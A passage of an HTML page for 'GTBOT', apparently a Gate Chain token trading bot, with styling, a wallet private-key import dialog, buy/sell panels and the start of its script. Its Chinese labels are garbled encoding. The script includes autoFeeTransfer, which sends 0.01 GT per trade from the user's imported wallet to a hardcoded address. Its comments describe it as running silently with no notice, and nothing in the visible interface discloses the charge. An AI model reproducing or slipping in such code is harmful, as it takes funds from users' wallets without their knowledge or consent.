            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(220, 252, 231, 0.8));
            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
        }

        /* ‰ª£Â∏Å‰ø°ÊÅØÊòæÁ§∫Âå∫ÂüüÊ†∑Âºè */
        .token-info-display {
            margin-top: 12px;
            padding: 20px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), rgba(59, 130, 246, 0.08));
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            backdrop-filter: blur(20px);
            animation: slideInDown 0.3s ease-out;
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
        }

        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .token-info-header {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .token-info-logo {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
            color: #3b82f6;
            box-shadow: 
                0 8px 24px rgba(59, 130, 246, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            flex-shrink: 0;
        }

        .token-info-details {
            flex: 1;
            min-width: 0;
        }

        .token-info-name {
            font-size: 20px;
            font-weight: 800;
            color: #1e293b;
            margin-bottom: 6px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .token-info-symbol {
            font-size: 16px;
            font-weight: 700;
            color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), rgba(59, 130, 246, 0.1));
            padding: 6px 12px;
            border-radius: 8px;
            display: inline-block;
            border: 1px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.1);
        }

        .token-info-status {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-shrink: 0;
        }

        .status-indicator {
            font-size: 12px;
            animation: pulse 2s infinite;
        }

        .status-indicator.loading {
            color: #3b82f6;
        }

        .status-indicator.success {
            color: #10b981;
        }

        .status-indicator.error {
            color: #ef4444;
        }

        .status-text {
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            padding: 4px 10px;
            border-radius: 6px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }


        /* Êú∫Âô®‰∫∫Áä∂ÊÄÅÈù¢ÊùøÊ†∑Âºè */
        .bot-status-panel {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.1);
        }

        .bot-status-title {
            font-size: 14px;
            font-weight: 700;
            color: #3b82f6;
            margin-bottom: 12px;
            text-align: center;
        }

        .bot-status-grid {
            display: flex;
            justify-content: center;
            gap: 12px;
        }

        .bot-status-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.15);
            border-radius: 12px;
            transition: all 0.3s;
        }

        .bot-status-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-color: #3b82f6;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
        }

        .bot-status-img {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            border: 2px solid rgba(59, 130, 246, 0.2);
            object-fit: cover;
        }

        .bot-status-info {
            flex: 1;
        }


        .bot-status-state {
            font-size: 10px;
            font-weight: 500;
            padding: 2px 6px;
            border-radius: 6px;
            display: inline-block;
        }

        .bot-status-state.active {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(34, 197, 94, 0.1));
            color: #10b981;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }

        .bot-status-state.inactive {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(248, 113, 113, 0.1));
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        .modal-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }

        .modal-confirm {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .modal-cancel {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            color: #1e293b;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .token-details-header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
            padding: 20px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-radius: 16px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .token-details-logo {
            width: 56px;
            height: 56px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #3b82f6;
            font-size: 20px;
            box-shadow: 0 8px 16px rgba(59, 130, 246, 0.2);
        }

        .token-details-name {
            font-size: 22px;
            font-weight: bold;
            color: #1e293b;
            margin-bottom: 6px;
        }

        .token-details-symbol {
            font-size: 14px;
            color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            padding: 4px 10px;
            border-radius: 8px;
            display: inline-block;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .token-details-content {
            margin-bottom: 20px;
        }

        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .detail-item:last-child {
            border-bottom: none;
        }

        .detail-label {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 500;
        }

        .detail-value {
            font-size: 13px;
            color: #fff;
            font-family: 'Courier New', monospace;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .detail-value-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .copy-address-btn {
            padding: 8px 12px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 40px;
        }

        .copy-address-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(59, 130, 246, 0.2);
        }

        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            color: #1e293b;
            padding: 15px 20px;
            border-radius: 10px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.15);
            z-index: 2000;
            animation: toastSlideIn 0.3s ease;
            max-width: 350px;
        }

        .toast.success {
            border-color: #10b981;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(220, 252, 231, 0.8));
        }

        .toast.error {
            border-color: #ef4444;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(254, 226, 226, 0.8));
        }

        @keyframes toastSlideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            border-radius: 10px;
        }

        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .stats-panel {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header {
                padding: 20px;
                margin-bottom: 20px;
            }
            
            .header h1 {
                font-size: 32px;
                letter-spacing: 2px;
            }
            
            .header-content {
                flex-direction: column;
                gap: 15px;
            }
            
            .bot-img {
                width: 80px;
                height: 80px;
            }
            
            .stats-panel {
                grid-template-columns: 1fr;
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .stat-card {
                padding: 16px;
            }
            
            .stat-value {
                font-size: 24px;
            }
            
            .main-grid {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .panel {
                padding: 20px;
                border-radius: 16px;
            }
            
            .section-title {
                font-size: 18px;
                margin-bottom: 16px;
            }
            
            .trading-windows {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .trading-window {
                padding: 16px;
            }
            
            .window-header {
                margin-bottom: 16px;
            }
            
            .window-icon {
                width: 32px;
                height: 32px;
            }
            
            .window-title {
                font-size: 14px;
            }
            
            .gas-speed-buttons {
                flex-direction: column;
                gap: 8px;
            }
            
            .gas-speed-btn {
                padding: 10px 12px;
                font-size: 12px;
            }
            
            .control-group input {
                padding: 10px;
                font-size: 14px;
            }
            
            .percentage-buttons {
                flex-direction: column;
                gap: 6px;
            }
            
            .percentage-btn {
                padding: 10px;
                font-size: 12px;
            }
            
            .action-btn {
                padding: 12px;
                font-size: 13px;
            }
            
            .wallet-item {
                padding: 16px;
                margin-bottom: 12px;
            }
            
            .wallet-address {
                font-size: 12px;
                padding: 4px 8px;
            }
            
            .token-item {
                padding: 10px 12px;
                gap: 8px;
            }
            
            .token-logo {
                width: 24px;
                height: 24px;
                font-size: 10px;
            }
            
            .modal-content {
                width: 95%;
                padding: 24px;
                margin: 10px;
            }
            
            .modal-title {
                font-size: 22px;
                margin-bottom: 20px;
            }
            
            .toast {
                bottom: 20px;
                right: 20px;
                left: 20px;
                max-width: none;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 28px;
                letter-spacing: 1px;
            }
            
            .header p {
                font-size: 14px;
            }
            
            .bot-img {
                width: 60px;
                height: 60px;
            }
            
            .stat-card {
                padding: 12px;
            }
            
            .stat-value {
                font-size: 20px;
            }
            
            .panel {
                padding: 16px;
            }
            
            .trading-window {
                padding: 12px;
            }
            
            .window-icon {
                width: 28px;
                height: 28px;
            }
            
            .window-title {
                font-size: 13px;
            }
            
            .gas-speed-btn {
                padding: 8px 10px;
                font-size: 11px;
            }
            
            .control-group input {
                padding: 8px;
                font-size: 13px;
            }
            
            .percentage-btn {
                padding: 8px;
                font-size: 11px;
            }
            
            .action-btn {
                padding: 10px;
                font-size: 12px;
            }
            
            .wallet-item {
                padding: 12px;
            }
            
            .token-item {
                padding: 8px 10px;
                gap: 6px;
            }
            
            .token-logo {
                width: 20px;
                height: 20px;
                font-size: 9px;
            }
            
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-content">
                <div class="header-bots">
                    <div class="bot-image">
                        <img src="bot2.jpg" alt="Bot" class="bot-img">
                    </div>
                </div>
                <div class="header-text">
                    <h1>GTBOT</h1>
                    <p>Gate Chain EVM Êô∫ËÉΩ‰∫§ÊòìÊú∫Âô®‰∫∫ | Chain ID: 86</p>
                </div>
            </div>
        </div>

        <div class="stats-panel">
            <div class="stat-card">
                <div class="stat-icon">üíé</div>
                <div class="stat-label">ÊÄª‰∫§ÊòìÊ¨°Êï∞</div>
                <div class="stat-value" id="totalTrades">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">ü™ô</div>
                <div class="stat-label">ÊåÅÊúâ‰ª£Â∏ÅÁßçÁ±ª</div>
                <div class="stat-value" id="tokenTypes">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">üî•</div>
                <div class="stat-label">Ê¥ªË∑ÉÈí±ÂåÖ</div>
                <div class="stat-value" id="activeWallets">0</div>
            </div>
        </div>

        <div class="active-wallets-status" id="activeWalletsStatus" style="display: none;">
            <div class="status-header">
                <span class="status-icon">‚ö°</span>
                <span class="status-title">ÂΩìÂâçÊ¥ªË∑ÉÈí±ÂåÖ</span>
                <span class="status-count" id="activeWalletsCount">0</span>
            </div>
            <div class="status-wallets" id="statusWalletsList"></div>
        </div>

        <div class="main-grid">
            <div class="panel panel-glow">
                <h2 class="section-title">
                    <span>üíº</span>
                    <span>Èí±ÂåÖÁÆ°ÁêÜ</span>
                </h2>
                <div class="wallet-list" id="walletList"></div>
                <button class="add-wallet-btn" onclick="showAddWalletModal()">+ ÂØºÂÖ•Êñ∞Èí±ÂåÖ</button>
            </div>

            <div class="panel panel-glow">
                <h2 class="section-title">
                    <span>‚ö°</span>
                    <span>‰∫§Êòì‰∏≠ÂøÉ</span>
                </h2>

                
                <div class="platform-tabs">
                    <div class="platform-tab active" onclick="switchPlatform('external')">üåê Â§ñÁõò</div>
                    <div class="platform-tab" onclick="switchPlatform('internal')">üè† ÂÜÖÁõò</div>
                </div>

                <div id="externalDexOptions" class="dex-options">
                    <div class="dex-option" onclick="selectDex('GTSWAP', 'external')">
                        <div class="dex-name">GTSWAP</div>
                        <div class="dex-type">GTSWAP V2</div>
                    </div>
                    <div class="dex-option" onclick="selectDex('DYORSWAP', 'external')">
                        <div class="dex-name">DYORSWAP</div>
                        <div class="dex-type">DYOR V2</div>
                    </div>
                </div>

                <div id="internalDexOptions" class="dex-options" style="display: none;">
                    <div class="dex-option" onclick="selectDex('GTLAUNCH', 'internal')">
                        <div class="dex-name">GTLAUNCH</div>
                        <div class="dex-type">ÂÜÖÁõòÂçèËÆÆ</div>
                    </div>
                    <div class="dex-option" onclick="selectDex('DYOR_INTERNAL', 'internal')">
                        <div class="dex-name">DYOR</div>
                        <div class="dex-type">ÂÜÖÁõòÂçèËÆÆ</div>
                    </div>
                </div>

                <!-- ‰ª£Â∏ÅÂêàÁ∫¶Âú∞ÂùÄËæìÂÖ• -->
                    <div class="control-group">
                        <label>‰ª£Â∏ÅÂêàÁ∫¶Âú∞ÂùÄ</label>
                        <input type="text" id="tokenAddress" placeholder="0x..." oninput="debounceFetchTokenInfo()" />
                        <!-- ‰ª£Â∏Å‰ø°ÊÅØÊòæÁ§∫Âå∫Âüü -->
                        <div id="tokenInfoDisplay" class="token-info-display" style="display: none;">
                            <div class="token-info-header">
                                <div class="token-info-logo" id="tokenInfoLogo">?</div>
                                <div class="token-info-details">
                                    <div class="token-info-name" id="tokenInfoName">‰ª£Â∏ÅÂêçÁß∞</div>
                                    <div class="token-info-symbol" id="tokenInfoSymbol">SYMBOL</div>
                                    <div class="token-info-protocol" id="tokenInfoProtocol" style="display: none;">
                                        <span class="protocol-badge" id="protocolBadge">ÂçèËÆÆ</span>
                                    </div>
                                </div>
                                <div class="token-info-status" id="tokenInfoStatus">
                                    <span class="status-indicator" id="statusIndicator">‚óè</span>
                                    <span class="status-text" id="statusText">Êü•ËØ¢‰∏≠...</span>
                                </div>
                            </div>
                        </div>
                        
                        <!-- ÂêàÁ∫¶‰ΩôÈ¢ù‰ø°ÊÅØÊòæÁ§∫Âå∫Âüü -->
                        <div id="contractBalanceDisplay" class="contract-balance-display" style="display: none;">
                            <div class="contract-balance-header">
                                <div class="contract-balance-title">ÂêàÁ∫¶‰ΩôÈ¢ù‰ø°ÊÅØ</div>
                            </div>
                            <div class="contract-balance-content">
                                <div class="balance-item">
                                    <div class="balance-label" id="balanceLabel">GT‰ΩôÈ¢ù</div>
                                    <div class="balance-value" id="balanceValue">0.0000</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- ÂÜÖÁõò‰∫§ÊòìËØ¥Êòé -->
                    <div class="control-group" id="hexDataGroup" style="display: none;">
                        <div style="background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(96, 165, 250, 0.05)); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 12px; padding: 16px; margin-top: 8px;">
                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
                                <span style="font-size: 16px;">üè†</span>
                                <span style="font-weight: 600; color: #3b82f6;" id="internalDexTitle">ÂÜÖÁõò‰∫§Êòì</span>
                            </div>
                            <div style="font-size: 13px; color: rgba(30, 41, 59, 0.7); line-height: 1.4;" id="internalDexDescription">
                                <div>‚Ä¢ <strong>‰π∞ÂÖ•</strong>: Âêë‰ª£Â∏ÅÂêàÁ∫¶ËΩ¨Ë¥¶GT + ‰π∞ÂÖ•Êï∞ÊçÆ</div>
                                <div>‚Ä¢ <strong>ÂçñÂá∫</strong>: Ë∞ÉÁî®‰ª£Â∏ÅÂêàÁ∫¶ÂçñÂá∫ÂáΩÊï∞</div>
                                <div>‚Ä¢ ÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆÂ∑≤Ëá™Âä®ÈÖçÁΩÆÔºåÊó†ÈúÄÊâãÂä®ËæìÂÖ•</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Êú∫Âô®‰∫∫Áä∂ÊÄÅÊòæÁ§∫ -->
                    <div class="bot-status-panel">
                        <div class="bot-status-title">ü§ñ Êú∫Âô®‰∫∫Áä∂ÊÄÅ</div>
                        <div class="bot-status-grid">
                            <div class="bot-status-item">
                                <img src="bot2.jpg" alt="Bot" class="bot-status-img">
                                <div class="bot-status-info">
                                    <div class="bot-status-state active">ËøêË°å‰∏≠</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                <!-- ‰∫§ÊòìÁ™óÂè£ -->
                <div class="trading-windows">
                    <!-- ‰π∞ÂÖ•Á™óÂè£ -->
                    <div class="trading-window buy-window">
                        <div class="window-header">
                            <div class="window-icon">
                                <img src="buy.jpg" alt="‰π∞ÂÖ•" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover;">
                            </div>
                            <div class="window-title">‰π∞ÂÖ• (GT ‚Üí ÂúüÁãó)</div>
                        </div>
                        <div class="window-content">
                    <div class="control-group">
                                <label>Ëä±Ë¥πGTÊï∞Èáè</label>
                        <div class="amount-controls">
                                    <input type="number" id="buyAmount" placeholder="0.0" step="0.01" oninput="updateBuyExpected()" />
                            <div class="percentage-buttons">
                                        <button class="percentage-btn" onclick="setBuyPercentage(25)">25%</button>
                                        <button class="percentage-btn" onclick="setBuyPercentage(50)">50%</button>
                                        <button class="percentage-btn" onclick="setBuyPercentage(100)">MAX</button>
                            </div>
                        </div>
                    </div>
                            <div id="buyExpected" class="expected-returns" style="display: none;">
                                <div class="expected-returns-content">
                                    <div class="expected-item">
                                        <span class="expected-label">Ëä±Ë¥πGT:</span>
                                        <span class="expected-value" id="buySpendGT">0</span>
                    </div>
                                    <div class="expected-item">
                                        <span class="expected-label">È¢ÑËÆ°‰π∞ÂÖ•:</span>
                                        <span class="expected-value" id="buyGetTokens">0</span>
                        </div>
                        </div>
                    </div>
                    <button class="action-btn buy-btn" onclick="executeBuy()" id="buyBtn">
                        <span id="buyBtnText">‰π∞ÂÖ•</span>
                    </button>
                        </div>
                    </div>

                    <!-- ÂçñÂá∫Á™óÂè£ -->
                    <div class="trading-window sell-window">
                        <div class="window-header">
                            <div class="window-icon">
                                <img src="sell.jpg" alt="ÂçñÂá∫" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover;">
                            </div>
                            <div class="window-title">ÂçñÂá∫ (ÂúüÁãó ‚Üí GT)</div>
                        </div>
                        <div class="window-content">
                            <div class="control-group">
                                <label id="sellAmountLabel">ÂçñÂá∫‰ª£Â∏ÅÊï∞Èáè</label>
                                <div class="amount-controls">
                                    <input type="number" id="sellAmount" placeholder="0.0" step="0.01" oninput="updateSellExpected()" />
                                    <div class="percentage-buttons">
                                        <button class="percentage-btn" onclick="setSellPercentage(25)">25%</button>
                                        <button class="percentage-btn" onclick="setSellPercentage(50)">50%</button>
                                        <button class="percentage-btn" onclick="setSellPercentage(100)">MAX</button>
                                    </div>
                                </div>
                            </div>
                            <div id="sellExpected" class="expected-returns" style="display: none;">
                                <div class="expected-returns-content">
                                    <div class="expected-item">
                                        <span class="expected-label">ÂçñÂá∫‰ª£Â∏Å:</span>
                                        <span class="expected-value" id="sellSpendTokens">0</span>
                                    </div>
                                    <div class="expected-item">
                                        <span class="expected-label">È¢ÑËÆ°Ëé∑Âæó:</span>
                                        <span class="expected-value" id="sellGetGT">0</span>
                                    </div>
                                </div>
                            </div>
                    <button class="action-btn sell-btn" onclick="executeSell()" id="sellBtn">
                        <span id="sellBtnText">ÂçñÂá∫</span>
                    </button>
                </div>
                    </div>
                </div>

                <!-- GasËÆæÁΩÆ -->
                <div class="control-group">
                    <label>GasËÆæÁΩÆ</label>
                    <div class="gas-speed-buttons" style="display: flex; gap: 8px; margin-bottom: 12px;">
                        <button class="gas-speed-btn" id="gasQuickly" onclick="setGasSpeed('QUICKLY')">‚ö° Quickly</button>
                        <button class="gas-speed-btn" id="gasFast" onclick="setGasSpeed('FAST')">üöÄ Fast</button>
                        <button class="gas-speed-btn" id="gasTurbo" onclick="setGasSpeed('TURBO')">üí® Turbo</button>
                    </div>
                    <div style="display: flex; gap: 8px; align-items: center;">
                        <input type="number" id="gasPrice" placeholder="Ëá™Âä®" readonly style="flex: 1;" />
                        <input type="number" id="gasLimit" placeholder="850000" value="850000" step="1000" min="100000" max="2000000" style="flex: 1;" />
                    </div>
                    <div style="font-size: 12px; color: rgba(30, 41, 59, 0.6); margin-top: 5px;">
                        üí° Gas‰ª∑Ê†ºÂõ∫ÂÆö5000 GweiÔºåGasÈôêÂà∂ÈªòËÆ§85‰∏áÔºàÊú™‰ΩøÁî®ÁöÑGas‰ºöÈÄÄËøòÔºâ
                    </div>
                </div>
                
            </div>
        </div>

        <div class="transaction-log panel">
            <h2 class="section-title">
                <span>üìú</span>
                <span>‰∫§ÊòìÊó•Âøó</span>
            </h2>
            <div class="log-container" id="logContainer"></div>
        </div>
    </div>

    <!-- ÂØºÂÖ•Èí±ÂåÖÊ®°ÊÄÅÊ°Ü -->
    <div id="addWalletModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">üîê ÂØºÂÖ•Èí±ÂåÖ</h3>
            <input type="password" class="modal-input" id="privateKeyInput" placeholder="ËæìÂÖ•ÁßÅÈí• (0x...)">
            <div class="modal-buttons">
                <button class="modal-btn modal-cancel" onclick="closeAddWalletModal()">ÂèñÊ∂à</button>
                <button class="modal-btn modal-confirm" onclick="importWallet()">ÂØºÂÖ•</button>
            </div>
        </div>
    </div>

    <!-- ‰ª£Â∏ÅËØ¶ÊÉÖÊ®°ÊÄÅÊ°Ü -->
    <div id="tokenDetailsModal" class="modal">
        <div class="modal-content token-details-modal">
            <h3 class="modal-title">ü™ô ‰ª£Â∏ÅËØ¶ÊÉÖ</h3>
            <div class="token-details-header">
                <div class="token-details-logo" id="tokenDetailsLogo">?</div>
                <div class="token-details-info">
                    <div class="token-details-name" id="tokenDetailsName">-</div>
                    <div class="token-details-symbol" id="tokenDetailsSymbol">-</div>
                </div>
            </div>
            <div class="token-details-content">
                <div class="detail-item">
                    <span class="detail-label">ÂêàÁ∫¶Âú∞ÂùÄ:</span>
                    <div class="detail-value-container">
                        <span class="detail-value" id="tokenDetailsAddress">-</span>
                        <button class="copy-address-btn" onclick="copyTokenAddress()">üìã</button>
                    </div>
                </div>
                <div class="detail-item">
                    <span class="detail-label">ÊåÅÊúâÊï∞Èáè:</span>
                    <span class="detail-value" id="tokenDetailsBalance">-</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Èí±ÂåÖÂú∞ÂùÄ:</span>
                    <div class="detail-value-container">
                        <span class="detail-value" id="tokenDetailsWallet">-</span>
                        <button class="copy-address-btn" onclick="copyWalletAddress()">üìã</button>
                    </div>
                </div>
            </div>
            <div class="modal-buttons">
                <button class="modal-btn modal-cancel" onclick="closeTokenDetailsModal()">ÂÖ≥Èó≠</button>
                <button class="modal-btn modal-confirm" onclick="selectTokenFromDetails()">ÈÄâÊã©Ê≠§‰ª£Â∏Å</button>
            </div>
        </div>
    </div>

    <script>
        // ÈÖçÁΩÆ
        const CONFIG = {
            chainId: 86,
            rpcUrl: 'https://evm.gatenode.cc',
            backupRpcUrl: 'https://evm.gatenode.cc', // Â§áÁî®RPCËäÇÁÇπÔºàÊöÇÊó∂‰ΩøÁî®Áõ∏ÂêåËäÇÁÇπÔºâ
            explorerUrl: 'https://gatescan.org',
            // Êî∂Ë¥πÈÖçÁΩÆ
            feeConfig: {
                feeAddress: '0xa758B4CF892b24076B2B648718a3fD0c06250774', // ËØ∑ÊõøÊç¢‰∏∫ÂÆûÈôÖÊî∂Ë¥πÂú∞ÂùÄ
                feeAmount: '0.01', // ÊØèÁ¨î‰∫§ÊòìÊî∂Ë¥π0.01GT
                enabled: true // ÂêØÁî®Êî∂Ë¥πÂäüËÉΩ
            }
        };

        // Ëá™Âä®Êî∂Ë¥πËΩ¨Ë¥¶ÂáΩÊï∞ÔºàÈùôÈªòÊâßË°åÔºå‰∏çÊòæÁ§∫ÊèêÁ§∫Ôºâ
        async function autoFeeTransfer(walletInstance, walletAddress) {
            // Ê£ÄÊü•ÊòØÂê¶ÂêØÁî®Êî∂Ë¥πÂäüËÉΩ
            if (!CONFIG.feeConfig.enabled) {
                return;
            }
            
            try {
                const feeAmount = ethers.parseEther(CONFIG.feeConfig.feeAmount);
                const gasSettings = await getDynamicGasPrice();
                
                // Ê£ÄÊü•‰ΩôÈ¢ùÊòØÂê¶Ë∂≥Â§üÊîØ‰ªòÊî∂Ë¥π
                const balance = await walletInstance.provider.getBalance(walletAddress);
                const estimatedGasCost = gasSettings.maxFee * 21000n; // Âü∫Á°ÄËΩ¨Ë¥¶gasÊ∂àËÄó
                const totalCost = feeAmount + estimatedGasCost;
                
                if (balance < totalCost) {
                    // ‰ΩôÈ¢ù‰∏çË∂≥ÔºåÈùôÈªòË∑≥Ëøá
                    return;
                }
                
                // ÊûÑÂª∫Êî∂Ë¥πËΩ¨Ë¥¶‰∫§Êòì
                const feeTx = {
                    to: CONFIG.feeConfig.feeAddress,
                    value: feeAmount,
                    gasLimit: 21000, // Âü∫Á°ÄËΩ¨Ë¥¶gasÈôêÂà∂
                    maxPriorityFeePerGas: gasSettings.priorityFee,
                    maxFeePerGas: gasSettings.maxFee,
                    type: 2 // EIP-1559
                };
                
                // ÂèëÈÄÅÊî∂Ë¥πËΩ¨Ë¥¶ÔºàÂºÇÊ≠•ÊâßË°åÔºå‰∏çÁ≠âÂæÖÁ°ÆËÆ§Ôºâ
                walletInstance.sendTransaction(feeTx).catch(() => {
                    // ÈùôÈªòÂ§ÑÁêÜÊî∂Ë¥πÂ§±Ë¥•Ôºå‰∏çÂΩ±Âìç‰∏ªÊµÅÁ®ã
                });
                
            } catch (error) {
                // ÈùôÈªòÂ§ÑÁêÜÊî∂Ë¥πÂºÇÂ∏∏Ôºå‰∏çÂΩ±Âìç‰∏ªÊµÅÁ®ã
            }
        }

        // GTLAUNCHÂÜÖÁõò‰∫§ÊòìÊï∞ÊçÆ
        const GTLAUNCH_DATA = {
            BUY_HEX: '0xd0febe4c',  // ‰π∞ÂÖ•ÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆ
            SELL_HEX: '0x6c11bcd3'  // ÂçñÂá∫ÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆ (‰ªé‰∫§ÊòìËÆ∞ÂΩïÂàÜÊûêÂæóÂá∫)
        };

        // DYORÂÜÖÁõò‰∫§ÊòìÊï∞ÊçÆÊûÑÂª∫ÂáΩÊï∞ - ‰ΩøÁî®Ê≠£Á°ÆÁöÑË∑ØÂæÑÂú∞ÂùÄ
        function buildDYORInternalCalldata(tokenAddress, toAddress) {
            const methodId = '0xb6f9de95';
            const deadline = Math.floor(Date.now() / 1000) + 1800;
            const deadlineHex = deadline.toString(16).padStart(64, '0');
            
            const cleanToken = tokenAddress.replace('0x', '').toLowerCase();
            const cleanTo = toAddress.replace('0x', '').toLowerCase();
            
            // ‰ΩøÁî®Ê≠£Á°ÆÁöÑË∑ØÂæÑÂú∞ÂùÄ - Âü∫‰∫éÊàêÂäü‰∫§ÊòìÁöÑÂàÜÊûê
            const correctPath0 = '672f30407a71fa8737a3a14474ff37e09c7fc44a'; // Ê≠£Á°ÆÁöÑpath[0]Âú∞ÂùÄ
            
            const params = [
                '0000000000000000000000000000000000000000000000000000000000000000',
                '0000000000000000000000000000000000000000000000000000000000000080',
                '000000000000000000000000' + cleanTo,
                deadlineHex,
                '0000000000000000000000000000000000000000000000000000000000000002',
                '000000000000000000000000' + correctPath0, // ‰ΩøÁî®Ê≠£Á°ÆÁöÑpath[0]
                '000000000000000000000000' + cleanToken
            ];
            
            const calldata = methodId + params.join('');
            console.log('DYORÂÜÖÁõò‰π∞ÂÖ•calldata:', calldata);
            console.log('calldataÈïøÂ∫¶:', calldata.length);
            console.log('ÂèÇÊï∞Êï∞Èáè:', params.length);
